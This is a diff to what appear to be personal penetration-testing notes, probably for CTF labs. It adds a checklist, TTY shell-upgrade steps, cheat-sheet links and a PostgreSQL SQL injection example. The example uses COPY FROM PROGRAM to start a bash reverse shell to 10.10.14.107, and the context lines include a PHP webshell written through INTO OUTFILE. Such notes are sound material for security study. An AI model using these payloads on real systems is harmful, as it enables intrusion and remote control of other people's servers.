@@ -4,6 +4,13 @@
 [a lot of good stuff](https://book.hacktricks.xyz/)
 [Cheat sheets](https://pentestmonkey.net/)
 
+# Check list
+[] Process running
+  - db
+  - ?? ???
+[] privileges
+[] scripts
+
 ## Automatic web enum
 - wpsscan -U user -P password
 - [crackmapexec](https://www.crackmapexec.wiki/)
@@ -143,7 +150,10 @@
   - python3 -c 'import pty;pty.spawn("/bin/bash")'
   - python3 -c  import pty;pty.spawn('/bin/bash') 
   - python -c 'import pty; pty.spawn("/bin/bash")'
+  - CTRL+Z
   - export TERM=xterm
+  - stty raw -echo; fg
+  - reset
   
 - Automatic
   - linpeas
@@ -170,6 +180,14 @@
   - Where are files written? / DocumentRoot
     - SELECT "<?php system($_GET['cmd']); ?>" into outfile "PATH/TO/SQL"
   - locate webshells
+  - Cheatsheets
+    - [Portswigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)
+    - [Pentestmonkey](https://pentestmonkey.net/category/cheat-sheet)
+```
+# Example PostgreSQl
+'; CREATE TABLE cmd_exec(cmd_output text); --
+'; COPY cmd_exec FROM PROGRAM 'bash -c ''bash -i >& /dev/tcp/10.10.14.107/1234 0>&1'''; --
+```
 
 ## Upload files
 ### Windows
